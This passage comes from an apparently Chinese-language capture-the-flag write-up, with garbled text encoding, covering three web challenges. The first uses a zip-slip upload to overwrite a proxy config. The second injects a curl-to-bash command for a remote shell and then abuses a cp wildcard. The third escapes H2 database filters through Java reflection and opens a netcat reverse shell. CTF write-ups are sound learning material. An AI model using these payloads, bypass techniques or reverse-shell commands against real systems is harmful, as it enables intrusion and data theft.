class="hljs-keyword">defer</span> fileInArchive.Close()<br><br>_, err = io.Copy(outFile, fileInArchive)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipFile</span><span class="hljs-params">(zipPath, destDir <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>zipReader, err := zip.OpenReader(zipPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> zipReader.Close()<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> zipReader.File &#123;<br>filePath := filepath.Join(destDir, file.Name)<br><span class="hljs-keyword">if</span> file.FileInfo().IsDir() &#123;<br><span class="hljs-keyword">if</span> err := os.MkdirAll(filePath, file.Mode()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = unzipSimpleFile(file, filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randFileName</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> uuid.New().String()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br><br>r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>xForwardedFor := c.GetHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br><br><span class="hljs-keyword">if</span> !strings.Contains(xForwardedFor, <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;only localhost can get flag&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>flag := os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;&quot;</span> &#123;<br>flag = <span class="hljs-string">&quot;flag&#123;testflag&#125;&quot;</span><br>&#125;<br><br>c.String(http.StatusOK, flag)<br>&#125;)<br><br>r.GET(<span class="hljs-string">&quot;/public/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;)<br><br>r.POST(<span class="hljs-string">&quot;/public/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;File upload failed&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>randomFolder := randFileName()<br>destDir := filepath.Join(uploadDir, randomFolder)<br><br><span class="hljs-keyword">if</span> err := os.MkdirAll(destDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to create directory&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>zipFilePath := filepath.Join(uploadDir, randomFolder+<span class="hljs-string">&quot;.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err := c.SaveUploadedFile(file, zipFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to save uploaded file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := unzipFile(zipFilePath, destDir); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error unzipping file:&quot;</span>, err)<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to unzip file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;File uploaded and extracted successfully to %s&quot;</span>, destDir),<br>&#125;)<br>&#125;)<br><br>r.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>çœ‹æºç å¥½åƒè¿˜æ˜¯æŒºç®€å•çš„å§ï¼Œåªè¦<code>xff</code>è®¿é—®<code>/flag</code>å°±è¡Œï¼Œä½†æ˜¯çœ‹é…ç½®æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dynamic configuration</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº†åå‘ä»£ç†åªè¦è®¿é—®<code>/public/index</code>å’Œ<code>/public/upload</code>çš„æµé‡æ‰ä¼šä¼ ç»™æœåŠ¡å™¨è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ‰“å¼€å®¹å™¨å°±æ˜¯404çš„åŸå› </p><p>æˆ‘ä»¬å†æ¥åˆ†ææºç ï¼Œçœ‹è§åªè®©ä¸Šä¼ å‹ç¼©åŒ…ï¼Œè¿˜ä¼šè§£å‹ï¼ŒéªŒè¯æ–¹å¼ä¹Ÿæ˜¯ä½¿ç”¨çš„<code>archive/zipæ¨¡å—</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209210831989.png" alt="image-20250209210831989"></p><p>é‚£æˆ‘ä»¬å¯ä»¥å°è¯•zipè§£å‹å¯¼è‡´<strong>ä»»æ„æ–‡ä»¶è¦†ç›–</strong></p><p>æˆ‘ä»¬çœ‹ä¸‹ä»–çš„ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/                                      <span class="hljs-comment"># æ ¹ç›®å½•</span><br>â”œâ”€â”€ /traefik                           <span class="hljs-comment"># Traefik äºŒè¿›åˆ¶æ–‡ä»¶</span><br>â”œâ”€â”€ /src                                <span class="hljs-comment"># é¡¹ç›®çš„æºä»£ç ç›®å½•(åˆ åˆ°äº†)</span><br>â”œâ”€â”€ /app                                <span class="hljs-comment"># åº”ç”¨ç›®å½•ï¼ŒåŒ…å«æ„å»ºåçš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶</span><br>â”‚   â”œâ”€â”€ /main                          <span class="hljs-comment"># ç”Ÿæˆçš„ Go äºŒè¿›åˆ¶æ–‡ä»¶</span><br>â”‚   â”œâ”€â”€ /uploads                       <span class="hljs-comment"># ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨ç›®å½•</span><br>â”‚   â”œâ”€â”€ /templates                     <span class="hljs-comment"># åº”ç”¨æ¨¡æ¿ç›®å½•</span><br>â”‚   â””â”€â”€ /.config                        <span class="hljs-comment"># é…ç½®æ–‡ä»¶ç›®å½•</span><br>â”‚       â”œâ”€â”€ /dynamic.yml               <span class="hljs-comment"># åŠ¨æ€é…ç½®æ–‡ä»¶</span><br>â”‚       â””â”€â”€ /traefik.yml               <span class="hljs-comment"># Traefik é…ç½®æ–‡ä»¶</span><br>â”œâ”€â”€ /run.sh                             <span class="hljs-comment"># å¯åŠ¨è„šæœ¬</span><br></code></pre></td></tr></table></figure><p>è¿˜å‘ç°æ¯æ¬¡è®¿é—®éƒ½ä¼šåŠ è½½<code>templates/index.html</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¦†ç›–ä»–å†™ä¸€ä¸ªxssæ‹¿åˆ°flagå¯¹ä¸å¯¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, &#123; <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &#125; &#125;)<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = data; &#125;);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ ä¹Ÿè¿™ä¹ˆæƒ³ï¼Œé‚£ä½ å°±é”™äº†ï¼Œé”™åœ¨å“ª</p><ol><li></li></ol><blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> adduser -D -h /dev/null ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> /app/uploads &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> ctf:ctf -R /app/.config /app/uploads </span><br></code></pre></td></tr></table></figure><p>çœ‹dockerfileå¯ä»¥å‘ç°æˆ‘ä»¬å¯¹<code>templates</code>æ–‡ä»¶å¤¹å¹¶æ²¡æœ‰æƒé™ï¼Œæ— æ³•è¿›è¡Œå†™å…¥ï¼Œï¼ˆåœ¨æœ¬åœ°æµ‹äº†å¥½ä¹…éƒ½å¯ä»¥ï¼Œä½†æ˜¯ä¸Šä¼ å¹³å°ä¸æˆåŠŸ)</p></blockquote><ol start="2"><li></li></ol><blockquote><p>ä½¿ç”¨çš„æ˜¯åå‘ä»£ç†ï¼Œxssè„šæœ¬çš„headerå°±æ— æ•ˆäº†</p></blockquote><p>æ‰€æœ‰æˆ‘ä»¬å¾—è¦†ç›–é…ç½®æ–‡ä»¶ï¼Œè¦†ç›–è¿™ä¸ªåŠ¨æ€é…ç½®æ–‡ä»¶</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209212939429.png" alt="image-20250209212939429"></p><p>é¦–å…ˆæˆ‘ä»¬å‡†å¤‡å¥½é…ç½®æ–‡ä»¶è„šæœ¬</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">middlewares:</span><br>    <span class="hljs-attr">forwardedHeaders:</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">customRequestHeaders:</span><br>          <span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-string">&quot;&#123;127.0.0.1&#125;&quot;</span><br><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">flag:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/flag`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br></code></pre></td></tr></table></figure><p>å‘½åä¸º<code>..1..1.config1dynamic.yml</code>(æ–‡ä»¶åä¸èƒ½æœ‰<code>/</code>æš‚æ—¶ç”¨<code>1</code>ä»£æ›¿)</p><p>å°†ä»–å‹ç¼©ï¼Œæ‹¿åˆ°notepad++ï¼ˆwinhexä¹Ÿè¡Œï¼‰æ‰“å¼€</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213519539.png" alt="image-20250209213519539"></p><p>æŠŠ<code>1</code>æ¢æˆ<code>/</code>ï¼Œæœ‰ä¸¤å¤„éƒ½è¦æ¢ä¸Š</p><p>ä¸Šä¼ å¹³å°ï¼Œåœ¨è®¿é—®&#x2F;flagå°±å¯ä»¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213900279.png" alt="image-20250209213900279"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>è¿™ä¸ªé¢˜ç›®ï¼Œå‘œå‘œå‘œï¼Œåˆšè¿›å»å®Œå…¨ä¸çŸ¥é“è¦å¹²å˜›ï¼Œç¬¬ä¸€æ¬¡çœ‹æºç ä¹Ÿæ²¡ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæµ…æµ…çš„ç¿»äº†ä¸€ä¸‹ï¼Œç¬¬äºŒå¤©å†çœ‹çš„æ—¶å€™æ‰å†æœ€ä¸‹é¢æ‰¾åˆ°</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>æˆ‘ä»¬ç›´æ¥å†ä¸Šä¼ <code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>æˆåŠŸæ‹¿åˆ°shell</p><p>æŸ¥çœ‹æ ¹ç›®å½•å‘ç°æœ‰flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</p><p>å°è¯•suidææƒä½†æ˜¯æ²¡æœ‰</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>çœ‹ä¸€ä¸‹<code>ps -ef</code>çœ‹çœ‹æ‰§è¡Œäº†ä»€ä¹ˆ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>å‘å…ˆæ‰§è¡Œäº†<code>/start.sh</code>å’Œ<code>backup.sh</code></p><p>startæ²¡æœ‰æƒé™çœ‹ä¸äº†ï¼Œé‚£å°±çœ‹backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>å‘ç°ä»–ä¼šä¸€ç›´æ‰§è¡Œï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯ç¯å¢ƒå˜é‡åŠ«æŒsleepå‡½æ•°è®©ä»–æ‰§è¡Œ<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>å†<code>export PATH=/tmp:$PATH</code>å†åˆ›å»ºä¸€ä¸ª<code>/tmp/sleep</code>ä¸º<code>cat /flag &gt; /var/www/html/backup/1</code>ç»™æƒé™</p><p>æˆ‘è‡ªå·±å°è¯•ä¼šæ‰§è¡Œ<code>/tem/sleep</code>ä½†ç”±äºæ²¡æœ‰æƒé™å°±æ˜¯ç©ºæ–‡ä»¶ï¼Œä½†æ˜¯backp.shä¸ä¼šæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>åæ¥å‘ç°<code>backup.sh</code>ä½¿ç”¨äº†é€šé…ç¬¦<code>*</code>é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å†æ–‡ä»¶åä¸Šä¸‹æ‰‹</p><p>åˆšåˆšå¥½cpæœ‰ä¸€ä¸ªå‚æ•°<code>-H</code>å¯ä»¥è®©è½¯é“¾æ¥ä¹Ÿè¢«å¤åˆ¶</p><p>é‚£ä¹ˆå°±å¯ä»¥å®ç°</p><p>payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  ä¸æ˜¯å¸¸è§„æ–‡ä»¶åä¸å¯ä»¥ç”¨<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>ç„¶åç­‰ä¸€ä¼šå‘ç°<code>/backup</code>æ–‡ä»¶å¤¹ä¸­æœ‰1</p><p>å†è¯»å–1æ‹¿åˆ°flag</p><h2 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h2><p>çœŸçš„easyå—ï¼Œå‘œå‘œå‘œï¼Œæºç åˆ†æå¾—åˆ°æ•°æ®åº“æ˜¯<code>h2</code>æ•°æ®åº“ï¼Œæœ‰ä¸€ä¸ªè´¦å·</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin<br><span class="hljs-symbol">passwd:</span>admin<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ï¼Œè€Œä¸”flagè¦é€šè¿‡&#x2F;readflagè¯»å–ï¼Œå•çº¯sqlæ˜¯æ‹¿ä¸åˆ°é«˜shellçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¦å¯»ä»–æ³•</p><p>ä¸Šç½‘æŸ¥åˆ°h2æ•°æ®åº“å¯ä»¥æ‰§è¡Œjavaä»£ç ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œèƒ½</p><p>ç½‘ä¸Šä¸‹è½½äº†h2æ•°æ®åº“æœ¬åœ°éƒ¨ç½²</p><p>å†™ä¸€ä¸ªJavaå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS exec_cmd; CREATE ALIAS exec_cmd AS <span class="hljs-string">&#x27;String rce() throws java.io.IOException &#123;</span><br><span class="hljs-string">    java.util.Scanner cmd_output = new java.util.Scanner(Runtime.getRuntime().exec(&quot;ls&quot;).getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span><br><span class="hljs-string">    return cmd_output.hasNext() ? cmd_output.next() : &quot;&quot;;</span><br><span class="hljs-string">&#125;&#x27;</span>; CALL <span class="hljs-title function_">exec_cmd</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>å‘ç°ç¡®å®å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210224050126.png" alt="image-20250210224050126"></p><p>ä½†æ˜¯å­˜åœ¨é»‘åå•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>  blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡Javaçš„åå°„æœºåˆ¶æ”¹å†™ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS RCE;<br>CREATE ALIAS RCE AS $$ <br>String <span class="hljs-title function_">rce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123; <br>  <span class="hljs-type">byte</span>[] classNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodName2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;; <br>  <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./readflag&quot;</span>; <br>  Class&lt;?&gt; clazz = java.lang.Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(classNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method1</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodName2), String.class); <br>  method2.invoke(method1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;payload&#125;); <br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Exploited&quot;</span>; <br>&#125; $$;CALL <span class="hljs-title function_">RCE</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¸Šä¼ ä¹‹å</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/c7896c977a222bee80520fb8f7e7cb58.png" alt="c7896c977a222bee80520fb8f7e7cb58"></p><p>åªæ˜¯è¿™æ ·æ²¡æœ‰å›æ˜¾ï¼Œåé¢è¯•äº†å¥½ä¹…æ˜¯ï¼Œè¦ä¸å°±æ˜¯500</p><p>åˆå»ç½‘ä¸Šæ‰¾äº†ä¸‹æ‰¾åˆ°<a href="https://www.cnblogs.com/F12-blog/p/18144377">è¿™ç¯‡æ–‡ç« </a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210233304791.png" alt="image-20250210233304791"></p><p>ä¸Šä¼ æ¶æ„sqlæ–‡ä»¶ï¼Œå†æ§åˆ¶jdbc urlæŒ‡å‘ä»–</p><p>é‚£å°±ä¸è¦è¿‡æ»¤äº†ï¼Œç›´æ¥å†™java</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS RCE <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;String rce(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;1&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">CALL</span> RCE (<span class="hljs-string">&#x27;nc ip 32771 -e /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>python3 -m http.server 